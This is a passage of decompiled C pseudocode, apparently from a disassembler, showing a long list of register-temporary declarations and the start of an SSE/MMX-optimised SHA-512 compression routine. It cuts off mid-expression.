  __m128i v226; // xmm3
  __m128i v227; // xmm5
  __m128i v228; // xmm6
  __m128i v229; // xmm4
  __m128i v230; // xmm2
  __m128i v231; // xmm5
  __m128i v232; // xmm6
  __m128i v233; // xmm5
  __m128i v234; // xmm2
  __m128i v235; // xmm5
  __m128i v236; // xmm4
  __m128i v237; // xmm2
  __m64 v238; // mm1
  __m64 v239; // mm5
  __m64 v240; // mm4
  __m64 v241; // mm0
  __m64 v242; // mm3
  __m64 v243; // mm1
  __m64 v244; // mm3
  __m64 v245; // mm4
  __m64 v246; // mm3
  __m64 v247; // mm4
  __m64 v248; // mm7
  __m64 v249; // mm6
  __m64 v250; // mm5
  __m64 v251; // mm7
  __m64 v252; // mm6
  __m64 v253; // mm0
  __m64 v254; // mm2
  __m64 v255; // mm1
  __m64 v256; // mm5
  __m64 v257; // mm4
  __m64 v258; // mm2
  __m64 v259; // mm3
  __m64 v260; // mm1
  __m64 v261; // mm3
  __m64 v262; // mm4
  __m64 v263; // mm3
  __m64 v264; // mm4
  __m64 v265; // mm7
  __m64 v266; // mm6
  __m64 v267; // mm5
  __m64 v268; // mm7
  __m64 v269; // mm6
  __m64 v270; // mm2
  __m64 v271; // mm0
  __m128i v272; // xmm4
  __m128i v273; // xmm6
  __m128i v274; // xmm7
  __m128i v275; // xmm5
  __m128i v276; // xmm3
  __m128i v277; // xmm6
  __m128i v278; // xmm7
  __m128i v279; // xmm6
  __m128i v280; // xmm3
  __m128i v281; // xmm6
  __m128i v282; // xmm5
  __m128i v283; // xmm3
  __m64 v284; // mm1
  __m64 v285; // mm5
  __m64 v286; // mm4
  __m64 v287; // mm0
  __m64 v288; // mm3
  __m64 v289; // mm1
  __m64 v290; // mm3
  __m64 v291; // mm4
  __m64 v292; // mm3
  __m64 v293; // mm4
  __m64 v294; // mm7
  __m64 v295; // mm6
  __m64 v296; // mm5
  __m64 v297; // mm7
  __m64 v298; // mm6
  __m64 v299; // mm0
  __m64 v300; // mm2
  __m64 v301; // mm1
  __m64 v302; // mm5
  __m64 v303; // mm4
  __m64 v304; // mm2
  __m64 v305; // mm3
  __m64 v306; // mm1
  __m64 v307; // mm3
  __m64 v308; // mm4
  __m64 v309; // mm3
  __m64 v310; // mm4
  __m64 v311; // mm7
  __m64 v312; // mm6
  __m64 v313; // mm5
  __m64 v314; // mm7
  __m64 v315; // mm6
  __m64 v316; // mm2
  __m64 v317; // mm0
  __m128i v318; // xmm5
  __m128i v319; // xmm7
  __m128i v320; // xmm0
  __m128i v321; // xmm6
  __m128i v322; // xmm4
  __m128i v323; // xmm7
  __m128i v324; // xmm0
  __m128i v325; // xmm7
  __m128i v326; // xmm4
  __m128i v327; // xmm7
  __m128i v328; // xmm6
  __m64 v329; // mm1
  __m64 v330; // mm5
  __m64 v331; // mm4
  __m64 v332; // mm0
  __m64 v333; // mm3
  __m64 v334; // mm1
  __m64 v335; // mm3
  __m64 v336; // mm4
  __m64 v337; // mm3
  __m64 v338; // mm4
  __m64 v339; // mm7
  __m64 v340; // mm6
  __m64 v341; // mm5
  __m64 v342; // mm7
  __m64 v343; // mm6
  __m64 v344; // mm0
  __m64 v345; // mm2
  __m64 v346; // mm1
  __m64 v347; // mm5
  __m64 v348; // mm4
  __m64 v349; // mm2
  __m64 v350; // mm3
  __m64 v351; // mm1
  __m64 v352; // mm3
  __m64 v353; // mm4
  __m64 v354; // mm3
  __m64 v355; // mm4
  __m64 v356; // mm7
  __m64 v357; // mm6
  __m64 v358; // mm5
  __m64 v359; // mm7
  __m64 v360; // mm6
  __m64 v361; // mm2
  __m64 v362; // mm0
  __m128i v363; // xmm6
  __m128i v364; // xmm0
  __m128i v365; // xmm1
  __m128i v366; // xmm7
  __m128i v367; // xmm5
  __m128i v368; // xmm0
  __m128i v369; // xmm1
  __m128i v370; // xmm0
  __m128i v371; // xmm5
  __m128i v372; // xmm0
  __m128i v373; // xmm7
  __m64 v374; // mm1
  __m64 v375; // mm5
  __m64 v376; // mm4
  __m64 v377; // mm0
  __m64 v378; // mm3
  __m64 v379; // mm1
  __m64 v380; // mm3
  __m64 v381; // mm4
  __m64 v382; // mm3
  __m64 v383; // mm4
  __m64 v384; // mm7
  __m64 v385; // mm6
  __m64 v386; // mm5
  __m64 v387; // mm7
  __m64 v388; // mm6
  __m64 v389; // mm0
  __m64 v390; // mm2
  __m64 v391; // mm1
  __m64 v392; // mm5
  __m64 v393; // mm4
  __m64 v394; // mm2
  __m64 v395; // mm3
  __m64 v396; // mm1
  __m64 v397; // mm3
  __m64 v398; // mm4
  __m64 v399; // mm3
  __m64 v400; // mm4
  __m64 v401; // mm7
  __m64 v402; // mm6
  __m64 v403; // mm5
  __m64 v404; // mm7
  __m64 v405; // mm6
  __m64 v406; // mm2
  __m64 v407; // mm0
  __m128i v408; // xmm7
  __m128i v409; // xmm1
  __m128i v410; // xmm2
  __m128i v411; // xmm0
  __m128i v412; // xmm6
  __m128i v413; // xmm1
  __m128i v414; // xmm2
  __m128i v415; // xmm1
  __m128i v416; // xmm6
  __m128i v417; // xmm1
  __m128i v418; // xmm0
  __m64 v419; // mm1
  __m64 v420; // mm5
  __m64 v421; // mm4
  __m64 v422; // mm0
  __m64 v423; // mm3
  __m64 v424; // mm1
  __m64 v425; // mm3
  __m64 v426; // mm4
  __m64 v427; // mm3
  __m64 v428; // mm4
  __m64 v429; // mm7
  __m64 v430; // mm6
  __m64 v431; // mm5
  __m64 v432; // mm7
  __m64 v433; // mm6
  __m64 v434; // mm0
  __m64 v435; // mm2
  __m64 v436; // mm1
  __m64 v437; // mm5
  __m64 v438; // mm4
  __m64 v439; // mm2
  __m64 v440; // mm3
  __m64 v441; // mm1
  __m64 v442; // mm3
  __m64 v443; // mm4
  __m64 v444; // mm3
  __m64 v445; // mm4
  __m64 v446; // mm7
  __m64 v447; // mm6
  __m64 v448; // mm5
  __m64 v449; // mm7
  __m64 v450; // mm6
  __m64 v451; // mm2
  __m64 v452; // mm0
  __m128i v453; // xmm2
  __m128i v454; // xmm3
  __m128i v455; // xmm1
  __m128i v456; // xmm7
  __m128i v457; // xmm2
  __m128i v458; // xmm3
  __m128i v459; // xmm2
  __m128i v460; // xmm7
  __m128i v461; // xmm2
  __m128i v462; // xmm1
  __m128i v463; // xmm3
  __m64 v464; // mm1
  __m64 v465; // mm5
  __m64 v466; // mm4
  __m64 v467; // mm0
  __m64 v468; // mm3
  __m64 v469; // mm1
  __m64 v470; // mm3
  __m64 v471; // mm4
  __m64 v472; // mm3
  __m64 v473; // mm4
  __m64 v474; // mm7
  __m64 v475; // mm6
  __m64 v476; // mm5
  __m64 v477; // mm7
  __m64 v478; // mm6
  __m64 v479; // mm0
  __m64 v480; // mm2
  __m64 v481; // mm1
  __m64 v482; // mm5
  __m64 v483; // mm4
  __m64 v484; // mm2
  __m64 v485; // mm3
  __m64 v486; // mm1
  __m64 v487; // mm3
  __m64 v488; // mm4
  __m64 v489; // mm7
  __m64 v490; // mm6
  __m64 v491; // mm5
  __m64 v492; // mm7
  __m64 v493; // mm6
  __m64 v494; // mm6
  __m128i v495; // xmm1
  __m128i v496; // xmm0
  __m128i v497; // xmm2
  __m128i v498; // xmm1
  __m64 v499; // mm1
  __m64 v500; // mm5
  __m64 v501; // mm4
  __m64 v502; // mm0
  __m64 v503; // mm3
  __m64 v504; // mm1
  __m64 v505; // mm3
  __m64 v506; // mm4
  __m64 v507; // mm3
  __m64 v508; // mm4
  __m64 v509; // mm7
  __m64 v510; // mm6
  __m64 v511; // mm5
  __m64 v512; // mm7
  __m64 v513; // mm6
  __m64 v514; // mm0
  __m64 v515; // mm2
  __m64 v516; // mm1
  __m64 v517; // mm5
  __m64 v518; // mm4
  __m64 v519; // mm2
  __m64 v520; // mm3
  __m64 v521; // mm1
  __m64 v522; // mm3
  __m64 v523; // mm4
  __m64 v524; // mm3
  __m64 v525; // mm4
  __m64 v526; // mm7
  __m64 v527; // mm6
  __m64 v528; // mm5
  __m64 v529; // mm7
  __m64 v530; // mm6
  __m64 v531; // mm2
  __m64 v532; // mm0
  __m128i v533; // xmm3
  __m128i v534; // xmm2
  __m64 v535; // mm1
  __m64 v536; // mm5
  __m64 v537; // mm4
  __m64 v538; // mm0
  __m64 v539; // mm3
  __m64 v540; // mm1
  __m64 v541; // mm3
  __m64 v542; // mm4
  __m64 v543; // mm3
  __m64 v544; // mm4
  __m64 v545; // mm7
  __m64 v546; // mm6
  __m64 v547; // mm5
  __m64 v548; // mm7
  __m64 v549; // mm6
  __m64 v550; // mm0
  __m64 v551; // mm2
  __m64 v552; // mm1
  __m64 v553; // mm5
  __m64 v554; // mm4
  __m64 v555; // mm2
  __m64 v556; // mm3
  __m64 v557; // mm1
  __m64 v558; // mm3
  __m64 v559; // mm4
  __m64 v560; // mm3
  __m64 v561; // mm4
  __m64 v562; // mm7
  __m64 v563; // mm6
  __m64 v564; // mm5
  __m64 v565; // mm7
  __m64 v566; // mm6
  __m64 v567; // mm2
  __m64 v568; // mm0
  __m128i v569; // xmm4
  __m64 v570; // mm1
  __m64 v571; // mm5
  __m64 v572; // mm4
  __m64 v573; // mm0
  __m64 v574; // mm3
  __m64 v575; // mm1
  __m64 v576; // mm3
  __m64 v577; // mm4
  __m64 v578; // mm3
  __m64 v579; // mm4
  __m64 v580; // mm7
  __m64 v581; // mm6
  __m64 v582; // mm5
  __m64 v583; // mm7
  __m64 v584; // mm6
  __m64 v585; // mm0
  __m64 v586; // mm2
  __m64 v587; // mm1
  __m64 v588; // mm5
  __m64 v589; // mm4
  __m64 v590; // mm2
  __m64 v591; // mm3
  __m64 v592; // mm1
  __m64 v593; // mm3
  __m64 v594; // mm4
  __m64 v595; // mm3
  __m64 v596; // mm4
  __m64 v597; // mm7
  __m64 v598; // mm6
  __m64 v599; // mm5
  __m64 v600; // mm7
  __m64 v601; // mm6
  __m64 v602; // mm2
  __m64 v603; // mm0
  __m128i v604; // xmm5
  __m64 v605; // mm1
  __m64 v606; // mm5
  __m64 v607; // mm4
  __m64 v608; // mm0
  __m64 v609; // mm3
  __m64 v610; // mm1
  __m64 v611; // mm3
  __m64 v612; // mm4
  __m64 v613; // mm3
  __m64 v614; // mm4
  __m64 v615; // mm7
  __m64 v616; // mm6
  __m64 v617; // mm5
  __m64 v618; // mm7
  __m64 v619; // mm6
  __m64 v620; // mm0
  __m64 v621; // mm2
  __m64 v622; // mm1
  __m64 v623; // mm5
  __m64 v624; // mm4
  __m64 v625; // mm2
  __m64 v626; // mm3
  __m64 v627; // mm1
  __m64 v628; // mm3
  __m64 v629; // mm4
  __m64 v630; // mm3
  __m64 v631; // mm4
  __m64 v632; // mm7
  __m64 v633; // mm6
  __m64 v634; // mm5
  __m64 v635; // mm7
  __m64 v636; // mm6
  __m64 v637; // mm2
  __m64 v638; // mm0
  __m128i v639; // xmm6
  __m64 v640; // mm1
  __m64 v641; // mm5
  __m64 v642; // mm4
  __m64 v643; // mm0
  __m64 v644; // mm3
  __m64 v645; // mm1
  __m64 v646; // mm3
  __m64 v647; // mm4
  __m64 v648; // mm3
  __m64 v649; // mm4
  __m64 v650; // mm7
  __m64 v651; // mm6
  __m64 v652; // mm5
  __m64 v653; // mm7
  __m64 v654; // mm6
  __m64 v655; // mm0
  __m64 v656; // mm2
  __m64 v657; // mm1
  __m64 v658; // mm5
  __m64 v659; // mm4
  __m64 v660; // mm2
  __m64 v661; // mm3
  __m64 v662; // mm1
  __m64 v663; // mm3
  __m64 v664; // mm4
  __m64 v665; // mm3
  __m64 v666; // mm4
  __m64 v667; // mm7
  __m64 v668; // mm6
  __m64 v669; // mm5
  __m64 v670; // mm7
  __m64 v671; // mm6
  __m64 v672; // mm2
  __m64 v673; // mm0
  __m128i v674; // xmm7
  __m64 v675; // mm1
  __m64 v676; // mm5
  __m64 v677; // mm4
  __m64 v678; // mm0
  __m64 v679; // mm3
  __m64 v680; // mm1
  __m64 v681; // mm3
  __m64 v682; // mm4
  __m64 v683; // mm3
  __m64 v684; // mm4
  __m64 v685; // mm7
  __m64 v686; // mm6
  __m64 v687; // mm5
  __m64 v688; // mm7
  __m64 v689; // mm6
  __m64 v690; // mm0
  __m64 v691; // mm2
  __m64 v692; // mm1
  __m64 v693; // mm5
  __m64 v694; // mm4
  __m64 v695; // mm2
  __m64 v696; // mm3
  __m64 v697; // mm1
  __m64 v698; // mm3
  __m64 v699; // mm4
  __m64 v700; // mm3
  __m64 v701; // mm4
  __m64 v702; // mm7
  __m64 v703; // mm6
  __m64 v704; // mm5
  __m64 v705; // mm7
  __m64 v706; // mm6
  __m64 v707; // mm2
  __m64 v708; // mm0
  __m64 v709; // mm1
  __m64 v710; // mm5
  __m64 v711; // mm4
  __m64 v712; // mm0
  __m64 v713; // mm3
  __m64 v714; // mm1
  __m64 v715; // mm3
  __m64 v716; // mm4
  __m64 v717; // mm3
  __m64 v718; // mm4
  __m64 v719; // mm7
  __m64 v720; // mm6
  __m64 v721; // mm5
  __m64 v722; // mm7
  __m64 v723; // mm6
  __m64 v724; // mm0
  __m64 v725; // mm2
  __m64 v726; // mm1
  __m64 v727; // mm5
  __m64 v728; // mm4
  __m64 v729; // mm2
  __m64 v730; // mm3
  __m64 v731; // mm1
  __m64 v732; // mm3
  __m64 v733; // mm4
  __m64 v734; // mm3
  __m64 v735; // mm4
  __m64 v736; // mm7
  __m64 v737; // mm6
  __m64 v738; // mm5
  __m64 v739; // mm7
  __m64 v740; // mm6
  __m64 v741; // mm2
  __m64 v742; // mm0
  __m64 v743; // mm1
  __m64 v744; // mm5
  __m64 v745; // mm4
  __m64 v746; // mm0
  __m64 v747; // mm3
  __m64 v748; // mm1
  __m64 v749; // mm3
  __m64 v750; // mm4
  __m64 v751; // mm3
  __m64 v752; // mm4
  __m64 v753; // mm7
  __m64 v754; // mm6
  __m64 v755; // mm5
  __m64 v756; // mm7
  __m64 v757; // mm6
  __m64 v758; // mm0
  __m64 v759; // mm2
  __m64 v760; // mm1
  __m64 v761; // mm5
  __m64 v762; // mm4
  __m64 v763; // mm2
  __m64 v764; // mm3
  __m64 v765; // mm1
  __m64 v766; // mm3
  __m64 v767; // mm4
  __m64 v768; // mm3
  __m64 v769; // mm4
  __m64 v770; // mm7
  __m64 v771; // mm6
  __m64 v772; // mm5
  __m64 v773; // mm7
  __m64 v774; // mm6
  __m64 v775; // mm2
  unsigned __int32 v776; // ecx
  unsigned __int32 v777; // edx
  unsigned __int32 v778; // ecx
  unsigned __int32 v779; // edx
  unsigned __int32 v780; // ecx
  unsigned __int32 v781; // edx
  unsigned __int32 v782; // ecx
  unsigned __int32 v783; // edx
  unsigned __int32 v784; // ecx
  unsigned __int32 v785; // edx
  unsigned __int32 v786; // ecx
  unsigned __int32 v787; // edx
  unsigned __int32 v788; // ecx
  unsigned __int32 v789; // edx
  unsigned __int32 v790; // ecx
  unsigned __int32 v791; // edx
  __int64 v792; // rax
  __int64 v793; // rcx
  __int64 v794; // kr10_8
  __int64 v795; // rcx
  __int64 v796; // rax
  __int64 v797; // kr48_8
  __int32 v798; // ecx
  __int32 v799; // edx
  __int32 v800; // ecx
  __int32 v801; // edx
  __int32 v802; // ecx
  __int32 v803; // edx
  __int32 v804; // ecx
  __int32 v805; // edx
  unsigned __int64 v806; // kr68_8
  __m64 v807; // [esp-260h] [ebp-380h]
  __m64 v808; // [esp-260h] [ebp-380h]
  __m64 v809; // [esp-260h] [ebp-380h]
  __m64 v810; // [esp-260h] [ebp-380h]
  __m64 v811; // [esp-260h] [ebp-380h]
  __m64 v812; // [esp-260h] [ebp-380h]
  __m64 v813; // [esp-260h] [ebp-380h]
  __m64 v814; // [esp-260h] [ebp-380h]
  __m64 v815; // [esp-258h] [ebp-378h]
  __m64 v816; // [esp-258h] [ebp-378h]
  __m64 v817; // [esp-258h] [ebp-378h]
  __m64 v818; // [esp-258h] [ebp-378h]
  __m64 v819; // [esp-258h] [ebp-378h]
  __m64 v820; // [esp-258h] [ebp-378h]
  __m64 v821; // [esp-258h] [ebp-378h]
  __m64 v822; // [esp-258h] [ebp-378h]
  __m64 v823; // [esp-250h] [ebp-370h]
  __m64 v824; // [esp-250h] [ebp-370h]
  __m64 v825; // [esp-250h] [ebp-370h]
  __m64 v826; // [esp-250h] [ebp-370h]
  __m64 v827; // [esp-250h] [ebp-370h]
  __m64 v828; // [esp-250h] [ebp-370h]
  __m64 v829; // [esp-250h] [ebp-370h]
  __m64 v830; // [esp-250h] [ebp-370h]
  __m64 v831; // [esp-248h] [ebp-368h]
  __m64 v832; // [esp-248h] [ebp-368h]
  __m64 v833; // [esp-248h] [ebp-368h]
  __m64 v834; // [esp-248h] [ebp-368h]
  __m64 v835; // [esp-248h] [ebp-368h]
  __m64 v836; // [esp-248h] [ebp-368h]
  __m64 v837; // [esp-248h] [ebp-368h]
  __m64 v838; // [esp-248h] [ebp-368h]
  __m64 v839; // [esp-240h] [ebp-360h]
  __m64 v840; // [esp-240h] [ebp-360h]
  __m64 v841; // [esp-240h] [ebp-360h]
  __m64 v842; // [esp-240h] [ebp-360h]
  __m64 v843; // [esp-240h] [ebp-360h]
  __m64 v844; // [esp-240h] [ebp-360h]
  __m64 v845; // [esp-240h] [ebp-360h]
  __m64 v846; // [esp-240h] [ebp-360h]
  __m64 v847; // [esp-238h] [ebp-358h]
  __m64 v848; // [esp-238h] [ebp-358h]
  __m64 v849; // [esp-238h] [ebp-358h]
  __m64 v850; // [esp-238h] [ebp-358h]
  __m64 v851; // [esp-238h] [ebp-358h]
  __m64 v852; // [esp-238h] [ebp-358h]
  __m64 v853; // [esp-238h] [ebp-358h]
  __m64 v854; // [esp-238h] [ebp-358h]
  __m64 v855; // [esp-230h] [ebp-350h]
  __m64 v856; // [esp-230h] [ebp-350h]
  __m64 v857; // [esp-230h] [ebp-350h]
  __m64 v858; // [esp-230h] [ebp-350h]
  __m64 v859; // [esp-230h] [ebp-350h]
  __m64 v860; // [esp-230h] [ebp-350h]
  __m64 v861; // [esp-230h] [ebp-350h]
  __m64 v862; // [esp-230h] [ebp-350h]
  __int64 v863; // [esp-230h] [ebp-350h]
  __m64 v864; // [esp-228h] [ebp-348h]
  __m64 v865; // [esp-228h] [ebp-348h]
  __m64 v866; // [esp-228h] [ebp-348h]
  __m64 v867; // [esp-228h] [ebp-348h]
  __m64 v868; // [esp-228h] [ebp-348h]
  __m64 v869; // [esp-228h] [ebp-348h]
  __m64 v870; // [esp-228h] [ebp-348h]
  __m64 v871; // [esp-228h] [ebp-348h]
  __int64 v872; // [esp-228h] [ebp-348h]
  _OWORD v873[4]; // [esp-220h] [ebp-340h] BYREF
  __m128i v874; // [esp-1E0h] [ebp-300h]
  __m128i v875; // [esp-1D0h] [ebp-2F0h]
  __m128i v876; // [esp-1C0h] [ebp-2E0h]
  __m128i v877; // [esp-1B0h] [ebp-2D0h]
  __m128i v878; // [esp-1A0h] [ebp-2C0h] BYREF
  __m128i v879; // [esp-190h] [ebp-2B0h] BYREF
  __m128i v880; // [esp-180h] [ebp-2A0h] BYREF
  __m128i v881; // [esp-170h] [ebp-290h] BYREF
  unsigned __int32 v882; // [esp-160h] [ebp-280h]
  unsigned int v883; // [esp-15Ch] [ebp-27Ch]
  unsigned int v884; // [esp-158h] [ebp-278h]
  int *v885; // [esp-154h] [ebp-274h]
  int v886; // [esp-150h] [ebp-270h] BYREF
  __m64 v887; // [esp-148h] [ebp-268h]
  __m64 v888; // [esp-140h] [ebp-260h]
  __int64 v889; // [esp-138h] [ebp-258h]
  __m64 v890; // [esp-110h] [ebp-230h]
  __m64 v891; // [esp-108h] [ebp-228h]
  __m64 v892; // [esp-100h] [ebp-220h]
  __m64 v893; // [esp-F8h] [ebp-218h]
  int v894; // [esp-F0h] [ebp-210h]
  int v895; // [esp-ECh] [ebp-20Ch]
  __m64 *v896; // [esp+110h] [ebp-10h]
  unsigned int *v897; // [esp+114h] [ebp-Ch]
  __int64 v898; // [esp+118h] [ebp-8h]

  v0 = (__m64 *)v888.m64_i32[1];
  v1 = (unsigned int *)v889;
  v2 = (const __m128i *)SHA512_Constants_465340;
  result = v889 + (HIDWORD(v889) << 7);
  v882 = v888.m64_u32[1];
  v883 = v889;
  v884 = result;
  v885 = &v886;
  if ( (dword_73C6D0 & 0x4000000) != 0 )
  {
    v4 = *(__m64 *)v888.m64_i32[1];
    v5 = *(__m64 *)(v888.m64_i32[1] + 8);
    v6 = *(__m64 *)(v888.m64_i32[1] + 16);
    v7 = *(__m64 *)(v888.m64_i32[1] + 24);
    v8 = *(__m64 *)(v888.m64_i32[1] + 32);
    v9 = *(__m64 *)(v888.m64_i32[1] + 40);
    v10 = *(__m64 *)(v888.m64_i32[1] + 48);
    v11 = *(__m64 *)(v888.m64_i32[1] + 56);
    if ( (*(&dword_73C6D0 + 1) & 0x200 | dword_73C6D0 & 0x1000000) == 16777728 )
    {
      si128 = _mm_load_si128((const __m128i *)&SHA512_Constants_465340[160]);
      v113 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)v889), si128);
      v114 = si128;
      v115 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)(v889 + 16)), si128);
      v873[0] = _mm_add_epi64(_mm_load_si128((const __m128i *)SHA512_Constants_465340), v113);
      v116 = v114;
      v117 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)(v889 + 32)), v114);
      v873[1] = _mm_add_epi64(_mm_load_si128((const __m128i *)&SHA512_Constants_465340[4]), v115);
      v118 = v116;
      v119 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)(v889 + 48)), v116);
      v873[2] = _mm_add_epi64(_mm_load_si128((const __m128i *)&SHA512_Constants_465340[8]), v117);
      v120 = v118;
      v121 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)(v889 + 64)), v118);
      v873[3] = _mm_add_epi64(_mm_load_si128((const __m128i *)&SHA512_Constants_465340[12]), v119);
      v122 = v120;
      v123 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)(v889 + 80)), v120);
      v874 = _mm_add_epi64(_mm_load_si128((const __m128i *)&SHA512_Constants_465340[16]), v121);
      v878 = v113;
      v124 = v122;
      v125 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)(v889 + 96)), v122);
      v875 = _mm_add_epi64(_mm_load_si128((const __m128i *)&SHA512_Constants_465340[20]), v123);
      v879 = v115;
      v126 = _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)(v889 + 112)), v124);
      v876 = _mm_add_epi64(_mm_load_si128((const __m128i *)&SHA512_Constants_465340[24]), v125);
      v880 = v117;
      v127 = _mm_load_si128(&v878);
      v877 = _mm_add_epi64(_mm_load_si128((const __m128i *)&SHA512_Constants_465340[28]), v126);
      do
      {
        v128 = _mm_load_si128(&v879);
        v881 = v119;
        v129 = v2 + 8;
        v815 = v5;
        v130 = (const __m128i *)v1;
        v823 = v6;
        v1 += 32;
        v831 = v7;
        v847 = v9;
        if ( (unsigned int)v1 < result )
          v130 = (const __m128i *)v1;
        v855 = v10;
        v131 = 4;
        v132 = _m_pxor(v6, v5);
        v864 = v11;
        v133.m64_u64 = 0i64;
        do
        {
          v134 = v128;
          v878 = v121;
          v135 = _mm_alignr_epi8(v123, v121, 8);
          v136 = _mm_alignr_epi8(v128, v127, 8);
          v137 = _mm_srli_epi64(v136, 7u);
          v138 = _mm_add_epi64(v127, v135);
          v139 = v136;
          v140 = _mm_srli_epi64(v136, 1u);
          v141 = _mm_slli_epi64(v139, 0x38u);
          v142 = _mm_add_epi64(
                   v138,
                   _mm_xor_si128(
                     _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v137, v140), v141), _mm_srli_epi64(v140, 7u)),
                     _mm_slli_epi64(v141, 7u)));
          v143 = _mm_srli_epi64(v126, 0x13u);
          v144 = _mm_slli_epi64(v126, 3u);
          v145 = _mm_add_epi64(
                   v142,
                   _mm_xor_si128(
                     _mm_xor_si128(
                       _mm_xor_si128(_mm_xor_si128(_mm_srli_epi64(v126, 6u), v143), v144),
                       _mm_srli_epi64(v143, 0x2Au)),
                     _mm_slli_epi64(v144, 0x2Au)));
          v146 = _m_psrlqi(v8, 0xEu);
          v839 = v8;
          v147 = _m_pand(_m_pxor(v9, v10), v8);
          v148 = _m_psllqi(v8, 0x17u);
          v149 = _mm_add_si64(v4, v133);
          v150 = v146;
          v151 = _m_psrlqi(v146, 4u);
          v152 = _m_pxor(v150, v148);
          v153 = _m_psllqi(v148, 0x17u);
          v807 = v149;
          v154 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v152, v151), v153), _m_psrlqi(v151, 0x17u)), _m_psllqi(v153, 4u)),
                   _mm_add_si64(_mm_add_si64(*(__m64 *)&v873[0], _m_pxor(v147, v10)), v864));
          v155 = _mm_add_si64(v831, v154);
          v156 = _m_psrlqi(v149, 0x1Cu);
          v157 = _m_psllqi(v149, 0x19u);
          v158 = _m_psrlqi(v156, 6u);
          v159 = _m_pxor(v156, v157);
          v160 = _m_psllqi(v157, 5u);
          v161 = _m_pxor(v149, v815);
          v162 = _mm_add_si64(
                   _m_pxor(_m_pand(v132, v161), v815),
                   _m_pxor(_m_psllqi(v160, 6u), _m_pxor(_m_pxor(_m_pxor(v159, v158), v160), _m_psrlqi(v158, 5u))));
          v163 = _m_psrlqi(v155, 0xEu);
          v832 = v155;
          v164 = _m_pand(_m_pxor(v839, v847), v155);
          v165 = _m_psllqi(v155, 0x17u);
          v166 = _mm_add_si64(v162, v154);
          v167 = v163;
          v168 = _m_psrlqi(v163, 4u);
          v169 = _m_pxor(v167, v165);
          v170 = _m_psllqi(v165, 0x17u);
          v865 = v166;
          v171 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v169, v168), v170), _m_psrlqi(v168, 0x17u)), _m_psllqi(v170, 4u)),
                   _mm_add_si64(_mm_add_si64(*((__m64 *)&v873[0] + 1), _m_pxor(v164, v847)), v855));
          v172 = _mm_add_si64(v823, v171);
          v173 = _m_psrlqi(v166, 0x1Cu);
          v174 = _m_psllqi(v166, 0x19u);
          v175 = _m_psrlqi(v173, 6u);
          v176 = _m_pxor(v173, v174);
          v177 = _m_psllqi(v174, 5u);
          v178 = _m_pxor(v166, v807);
          v179 = _mm_add_si64(
                   _m_pxor(_m_pand(v161, v178), v807),
                   _m_pxor(_m_psllqi(v177, 6u), _m_pxor(_m_pxor(_m_pxor(v176, v175), v177), _m_psrlqi(v175, 5u))));
          v873[0] = _mm_add_epi64(_mm_load_si128(v129), v145);
          v180 = _mm_load_si128(&v880);
          v879 = v123;
          v181 = _mm_alignr_epi8(v125, v123, 8);
          v182 = _mm_alignr_epi8(v180, v134, 8);
          v183 = _mm_srli_epi64(v182, 7u);
          v184 = _mm_add_epi64(v134, v181);
          v185 = v182;
          v186 = _mm_srli_epi64(v182, 1u);
          v187 = _mm_slli_epi64(v185, 0x38u);
          v188 = _mm_add_epi64(
                   v184,
                   _mm_xor_si128(
                     _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v183, v186), v187), _mm_srli_epi64(v186, 7u)),
                     _mm_slli_epi64(v187, 7u)));
          v189 = _mm_srli_epi64(v145, 0x13u);
          v190 = _mm_slli_epi64(v145, 3u);
          v191 = _mm_add_epi64(
                   v188,
                   _mm_xor_si128(
                     _mm_xor_si128(
                       _mm_xor_si128(_mm_xor_si128(_mm_srli_epi64(v145, 6u), v189), v190),
                       _mm_srli_epi64(v189, 0x2Au)),
                     _mm_slli_epi64(v190, 0x2Au)));
          v192 = _m_psrlqi(v172, 0xEu);
          v824 = v172;
          v193 = _m_pand(_m_pxor(v832, v839), v172);
          v194 = _m_psllqi(v172, 0x17u);
          v195 = _mm_add_si64(v179, v171);
          v196 = v192;
          v197 = _m_psrlqi(v192, 4u);
          v198 = _m_pxor(v196, v194);
          v199 = _m_psllqi(v194, 0x17u);
          v856 = v195;
          v200 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v198, v197), v199), _m_psrlqi(v197, 0x17u)), _m_psllqi(v199, 4u)),
                   _mm_add_si64(_mm_add_si64(*(__m64 *)&v873[1], _m_pxor(v193, v839)), v847));
          v201 = _mm_add_si64(v815, v200);
          v202 = _m_psrlqi(v195, 0x1Cu);
          v203 = _m_psllqi(v195, 0x19u);
          v204 = _m_psrlqi(v202, 6u);
          v205 = _m_pxor(v202, v203);
          v206 = _m_psllqi(v203, 5u);
          v207 = _m_pxor(v195, v865);
          v208 = _mm_add_si64(
                   _m_pxor(_m_pand(v178, v207), v865),
                   _m_pxor(_m_psllqi(v206, 6u), _m_pxor(_m_pxor(_m_pxor(v205, v204), v206), _m_psrlqi(v204, 5u))));
          v209 = _m_psrlqi(v201, 0xEu);
          v816 = v201;
          v210 = _m_pand(_m_pxor(v824, v832), v201);
          v211 = _m_psllqi(v201, 0x17u);
          v212 = _mm_add_si64(v208, v200);
          v213 = v209;
          v214 = _m_psrlqi(v209, 4u);
          v215 = _m_pxor(v213, v211);
          v216 = _m_psllqi(v211, 0x17u);
          v848 = v212;
          v217 = _mm_add_si64(
                   _m_pxor(_m_pxor(_m_pxor(_m_pxor(v215, v214), v216), _m_psrlqi(v214, 0x17u)), _m_psllqi(v216, 4u)),
                   _mm_add_si64(_mm_add_si64(*((__m64 *)&v873[1] + 1), _m_pxor(v210, v832)), v839));
          v218 = _mm_add_si64(v807, v217);
          v219 = _m_psrlqi(v212, 0x1Cu);
          v220 = _m_psllqi(v212, 0x19u);
          v221 = _m_psrlqi(v219, 6u);
          v222 = _m_pxor(v219, v220);
          v223 = _m_psllqi(v220, 5u);
          v224 = _m_pxor(v212, v856);
          v225 = _mm_add_si64(
                   _m_pxor(_m_pand(v207, v224), v856),
